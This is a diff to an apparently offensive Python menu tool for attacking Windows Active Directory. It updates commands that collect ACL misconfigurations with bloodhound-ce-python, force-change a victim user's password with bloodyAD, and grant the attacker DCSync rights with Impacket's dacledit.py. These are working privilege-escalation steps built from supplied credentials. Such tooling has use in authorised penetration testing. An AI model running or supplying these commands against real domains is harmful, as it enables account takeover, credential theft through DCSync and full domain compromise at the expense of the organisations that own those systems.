@@ -15,7 +15,7 @@ def run():
     base_dn = "DC=" + dom.replace(".", ",DC=")
 
     print("""
-  [1]  Find ACL Misconfigs (bloodhound-python)
+  [1]  Find ACL Misconfigs (bloodhound-ce-python)
   [2]  Add User to Group   (GenericAll / GenericWrite)
   [3]  Force Change Password
   [4]  Grant DCSync Rights (WriteDACL)
@@ -27,7 +27,7 @@ def run():
     c = input(f"  {M}Choice:{RST} ").strip()
 
     if c == "1":
-        run_cmd(f"bloodhound-python -u {user} -p '{pw}' -d {dom} -dc {dc} -c All --zip")
+        run_cmd(f"bloodhound-ce-python -u {user} -p '{pw}' -d {dom} -dc DC01.{dom} -ns {dc} -c All --zip")
         info("Import ZIP into BloodHound → Shortest Paths to Domain Admins")
 
     elif c == "2":
@@ -40,7 +40,7 @@ def run():
     elif c == "3":
         victim = prompt("Victim username")
         newpw  = prompt("New password")
-        run_cmd(f"{imp('changepasswd.py')} {dom}/{victim}@{dc} -newpass '{newpw}' -altuser {user} -altpass '{pw}'")
+        run_cmd(f"bloodyAD --host {dc} -d {dom} -u {user} -p '{pw}' set password {victim} '{newpw}'")
 
     elif c == "4":
         run_cmd(f"{imp('dacledit.py')} -action write -rights DCSync -principal {user} -target-dn '{base_dn}' {dom}/{user}:'{pw}' -dc-ip {dc}")
